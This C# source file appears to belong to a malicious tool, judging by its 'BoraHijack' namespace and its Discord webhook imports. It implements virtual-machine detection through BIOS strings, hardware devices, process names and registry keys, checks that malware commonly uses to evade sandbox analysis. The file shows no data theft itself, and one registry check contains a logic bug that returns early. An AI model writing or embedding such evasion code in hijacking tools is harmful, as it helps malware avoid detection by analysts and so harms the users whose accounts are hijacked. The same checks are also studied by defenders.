using System;
using System.Diagnostics;
using System.Management;
using Microsoft.Win32;
using System.Collections.Generic;
using Discord;
using Discord.Webhook;

namespace BoraHijack.Common
{
    class CheckVM
    {

        // This whole section was made by gemini bc im not spending bunch of time
        // coding a whole vmdetect thing

        /// <summary>
        /// Checks for VM by examining the BIOS manufacturer and model strings.
        /// This is a common and often effective method.
        /// </summary>
        /// <returns>True if running in a known VM, false otherwise.</returns>
        public static bool IsRunningInVM_BIOS()
        {
            try
            {
                using (var searcher = new ManagementObjectSearcher("SELECT Manufacturer, Model FROM Win32_ComputerSystem"))
                {
                    foreach (ManagementObject item in searcher.Get())
                    {
                        string manufacturer = item["Manufacturer"]?.ToString() ?? "";
                        string model = item["Model"]?.ToString() ?? "";

                        // Common VM manufacturers and models
                        if (manufacturer.ToLower().Contains("vmware") ||
                            manufacturer.ToLower().Contains("virtualbox") ||
                            manufacturer.ToLower().Contains("microsoft corporation") && model.ToLower().Contains("virtual machine") ||
                            manufacturer.ToLower().Contains("parallels") ||
                            model.ToLower().Contains("virtual machine") || // Generic check for "virtual machine" in model
                            model.ToLower().Contains("hyper-v") ||
                            model.ToLower().Contains("qemu") ||
                            model.ToLower().Contains("bochs"))
                        {
                            //Console.WriteLine($"VM detected via BIOS: Manufacturer='{manufacturer}', Model='{model}'");
                            return true;
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error checking BIOS for VM: {ex.Message}");
            }
            return false;
        }

        /// <summary>
        /// Checks for specific VM-related hardware devices (e.g., VirtualBox Guest Additions, VMware Tools).
        /// </summary>
        /// <returns>True if VM-specific hardware is found, false otherwise.</returns>
        public static bool IsRunningInVM_Hardware()
        {
            try
            {
                // Check for common VM-specific devices using Win32_PnPEntity
                // This can be expanded with more specific device IDs if needed
                string[] vmDeviceKeywords = new string[]
                {
                    "vmware", "virtualbox", "vbox", "parallels", "hyper-v", "qemu", "virtio"
                };

                using (var searcher = new ManagementObjectSearcher("SELECT * FROM Win32_PnPEntity"))
                {
                    foreach (ManagementObject item in searcher.Get())
                    {
                        string deviceName = item["Caption"]?.ToString()?.ToLower() ?? "";
                        string deviceId = item["DeviceID"]?.ToString()?.ToLower() ?? "";

                        foreach (string keyword in vmDeviceKeywords)
                        {
                            if (deviceName.Contains(keyword) || deviceId.Contains(keyword))
                            {
                                Console.WriteLine($"VM detected via Hardware: Device='{deviceName}', DeviceID='{deviceId}'");
                                return true;
                            }
                        }
                    }
                }

                // Another specific check for video controllers often found in VMs
                using (var searcher = new ManagementObjectSearcher("SELECT * FROM Win32_VideoController"))
                {
                    foreach (ManagementObject item in searcher.Get())
                    {
                        string description = item["Description"]?.ToString()?.ToLower() ?? "";
                        if (description.Contains("vmware") ||
                            description.Contains("vbox") ||
                            description.Contains("qemu") ||
                            description.Contains("hyper-v"))
                        {
                            return true;
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error while checking hardware for VM: {ex.Message}");
            }
            return false;
        }


        /// <summary>
        /// Checks for the presence of VM-specific processes (e.g., VMwareUser, VBoxTray).
        /// </summary>
        /// <returns>True if VM-specific processes are running, false otherwise.</returns>
        public static bool IsRunningInVM_Processes()
        {
            string[] vmProcessNames = new string[]
            {
                "vmwareuser.exe", "vmtoolsd.exe", // VMware Tools
                "vboxservice.exe", "vboxtray.exe", // VirtualBox Guest Additions
                "prl_tools.exe", // Parallels Tools
                "vgauthservice.exe", // QEMU/KVM
                "qemu-ga.exe", // QEMU Guest Agent
                "vmware-view.exe", // VMware Horizon Client (if running in a VDI environment)
                "hyper-v.exe" // Hyper-V related process (less common for guest detection)
            };

            try
            {
                Process[] allProcesses = Process.GetProcesses();
                foreach (Process p in allProcesses)
                {
                    string processName = p.ProcessName.ToLower() + ".exe"; // Add .exe for accurate comparison
                    foreach (string vmProcess in vmProcessNames)
                    {
                        if (processName.Contains(vmProcess))
                        {
                            Console.WriteLine($"VM Detected by process: {vmProcess}");
                            return true;
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error while checking VM Processes: {ex.Message}");
                return false;
            }
            return false;
        }

        /// <summary>
        /// Checks for specific registry keys that indicate a virtualized environment.
        /// </summary>
        /// <returns>True if VM-specific registry keys are found, false otherwise.</returns>
        public static bool IsRunningInVM_Registry()
        {
            try
            {
                // VMware
                using (RegistryKey key = Registry.LocalMachine.OpenSubKey(@"HARDWARE\DEVICEMAP\Scsi\Scsi Port 0\Scsi Bus 0\Target Id 0\Logical Unit Id 0"))
                {
                    if (key != null && key.GetValue("Identifier")?.ToString().ToLower().Contains("vmware") == true)
                    {
                        Console.WriteLine("VM detected via Registry (VMware Identifier).");
                        return true;
                    }
                }

                // VirtualBox
                using (RegistryKey key = Registry.LocalMachine.OpenSubKey(@"HARDWARE\ACPI\DSDT\VBOX__"))
                {
                    if (key != null)
                    {
                        Console.WriteLine("VM detected via Registry (VirtualBox Identifier)");
                        return true;
                    }
                }

                using (RegistryKey key = Registry.LocalMachine.OpenSubKey(@"SYSTEM\CurrentControlSet\Enum\PCI"))
                {
                    if (key != null)
                    {
                        foreach (string subKeyName in key.GetSubKeyNames())
                        {
                            // Check for VirtualBox specific PCI device (e.g., VEN_80EE&DEV_CAFE)
                            if (subKeyName.ToLower().Contains("ven_80ee") && subKeyName.ToLower().Contains("dev_cafe"))
                            {
                                Console.WriteLine("VM detected via Registry (VirtualBox PCI device).");
                                return true;
                            }
                            // Check for VMware specific PCI device (e.g., VEN_15AD)
                            if (subKeyName.ToLower().Contains("ven_15ad"))
                            {
                                Console.WriteLine("VM detected via Registry (VMware PCI device).");
                                return true;
                            }
                            else
                            {
                                Console.WriteLine("No PCI VM Module Detected.");
                                return false;
                            }
                        }
                    }
                }

                // Hyper-V
                using (RegistryKey key = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Virtual Machine\Guest\Parameters"))
                {
                    if (key != null)
                    {
                        Console.WriteLine("VM detected via Registry (Hyper-V Guest Parameters).");
                        return true;
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error checking registry for VM: {ex.Message}");
            }
            return false;
        }

        /// <summary>
        /// Performs a comprehensive check for VM detection using multiple methods.
        /// </summary>
        /// <returns>True if any VM detection method returns true, false otherwise.</returns>
        public static bool IsRunningInVM_Comprehensive()
        {
            if (IsRunningInVM_BIOS())
            {
                Console.BackgroundColor = ConsoleColor.Red;
                Console.WriteLine("[-] Comprehensive Check: VM detected by BIOS.");
                Console.ResetColor();
                return true;
            }

            if (IsRunningInVM_Hardware())
            {
                Console.BackgroundColor = ConsoleColor.Red;
                Console.WriteLine("[-] Comprehensive Check: VM detected by Hardware.");
                Console.ResetColor();
                return true;
            }

            if (IsRunningInVM_Processes())
            {
                Console.BackgroundColor = ConsoleColor.Red;
                Console.WriteLine("[-] Comprehensive Check: VM detected by running Processes.");
                return true;
            }

            if (IsRunningInVM_Registry())
            {
                Console.BackgroundColor = ConsoleColor.Red;
                Console.WriteLine("[-] Comprehensive Check: VM detected by Registry entries.");
                Console.ResetColor();
                return true;
            }

            Console.BackgroundColor = ConsoleColor.Green;
            Console.WriteLine("[+] Comprehensive Check: No strong indicators of a VM found.");
            Console.ResetColor();
            return false;
        }
    }
}